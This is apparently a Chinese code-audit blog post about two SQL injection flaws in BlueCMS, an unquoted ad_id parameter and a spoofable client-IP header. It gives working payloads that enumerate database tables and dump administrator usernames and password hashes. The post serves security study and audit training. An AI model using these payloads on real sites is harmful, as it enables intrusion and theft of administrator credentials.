---
title: 代码审计之SQL注入：BlueCMSv1.6 sp1
date: 2017-03-14 19:39:02
tags: [代码审计,SQL注入]
categories: Web安全
---
代码审计学习
<!-- more -->

# 工具及环境
+ bluecms v2.1 sp1
链接：http://pan.baidu.com/s/1dFKLanR 密码：8v1c
+ seay审计系统
链接：http://pan.baidu.com/s/1dENS4KT 密码：rszt
+ 环境
PHP: 5.4.45
MYSQL: 5.5.53


# 注入一
## 审计
用seay审计系统审计一下,定位到/ad_js.php。
![](http://ojp0pjljj.bkt.clouddn.com/bluecms1.jpg)

该条语句为
```php
$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id);
```

getone()是自定义的函数，用来查询数据库，代码如下：
```php
function getone($sql, $type=MYSQL_ASSOC){
  $query = $this->query($sql,$this->linkid);
  $row = mysql_fetch_array($query, $type);
  return $row;
}
```
回到ad_js.php
```php
"SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id
```
可见这里的变量 $ad_id 没有单引号保护。接下来看看这个变量的来源。
![](http://ojp0pjljj.bkt.clouddn.com/bluecms2.jpg)

```php
$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';
```
若通过GET获得ad_id则去除它两边的空白字符，否则为空。在获得了ad_id值后，接下来就直接将$ad_id送入了查询语句，没有做任何过滤，因此这里存在注入。

## 利用
+ 先查询列数

    /ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6
    报错

![](http://ojp0pjljj.bkt.clouddn.com/bluecms3.jpg)

    ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,7,8
    报错

![](http://ojp0pjljj.bkt.clouddn.com/bluecms4.jpg)

    ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,7
    无报错，且查看源代码发现数字7有回显。
![](http://ojp0pjljj.bkt.clouddn.com/bluecms6.jpg)

+ 提取数据
利用元数据表爆出表名
```
    ad_js.php?ad_id=1+UNION+SELECT+1,2,3,4,5,6,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()
```
![](http://ojp0pjljj.bkt.clouddn.com/bluecms9.jpg)

+ 爆出字段

    ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e
![](http://ojp0pjljj.bkt.clouddn.com/bluecms10.jpg)
+ 获取用户名密码

    ad_js.php?ad_id=1 +UNION +SELECT+1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin  
![](http://ojp0pjljj.bkt.clouddn.com/bluecms10.jpg)

# 注入二
## 审计
函数定位：
```php
function getip()
{
	if (getenv('HTTP_CLIENT_IP'))
	{
		$ip = getenv('HTTP_CLIENT_IP');
	}
	elseif (getenv('HTTP_X_FORWARDED_FOR'))
	{ //????????????????????????????ip ???
		$ip = getenv('HTTP_X_FORWARDED_FOR');
	}
	elseif (getenv('HTTP_X_FORWARDED'))
	{
		$ip = getenv('HTTP_X_FORWARDED');
	}
	elseif (getenv('HTTP_FORWARDED_FOR'))
	{
		$ip = getenv('HTTP_FORWARDED_FOR');
	}
	elseif (getenv('HTTP_FORWARDED'))
	{
		$ip = getenv('HTTP_FORWARDED');
	}
	else
	{
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}
```
直接获取了ip，并没有验证IP格式，因此我们可以伪造ip。查看一下有哪些位置调用了 getip() ，
![](http://ojp0pjljj.bkt.clouddn.com/bluecms13.jpg)

## comment.php页面
其中有如下代码

    $sql = "INSERT INTO ".table('comment')." (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '".getip()."', '$is_check')";
    $db->query($sql);

可以看到，这里执行了INSERT语句，且调用了getip()，这里存在注入。

## 利用
这是目前的留言板：
![](http://ojp0pjljj.bkt.clouddn.com/bluecms17.jpg)

在burp截包后，post参数如下：
![](http://ojp0pjljj.bkt.clouddn.com/bluecms16.jpg)
所以

    user_id=2
    id=6 即 post_id=6 对应发表留言的文章id
    type=1
    mood=6 （这个无关紧要）

为了能让把管理员账号和密码回显出来，我们不能直接在getip()的位置上直接去查询。在前面的sql语句中，content变量是会回显到页面上的，这里利用这个位置去构造payload。

payload如下：

    1','1'),('','6','2','1','6',(select concat(admin_name,':',pwd) from blue_admin),'1','1

payload分析：1','1')是为了完成第一次插入，之后的（）是为了完成第二次插入，前面的 '','6','2','1','6' 是与第一个插入语句的参数相对应。接下来，我们把查询到的账号密码放在了第六个参数即content位置，这样能实现回显。而最后的 '1','1  是要满足列数相等否则会出错，同时要注意闭合原本语句中的单引号，其中第一个 1 对应sql语句中的$timestamp，表示发表时间，这个无关紧要。

所以这样插入后完整的sql语句是：

    $sql = INSERT INTO ".table('comment')." (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)
      VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '1','1'),('','6','2','1','6',(select concat(admin_name,':',pwd) from blue_admin),'1','1', '$is_check')";

![](http://ojp0pjljj.bkt.clouddn.com/bluecms18.jpg)
Forward后 注入成功。
![](http://ojp0pjljj.bkt.clouddn.com/bluecms20.jpg)
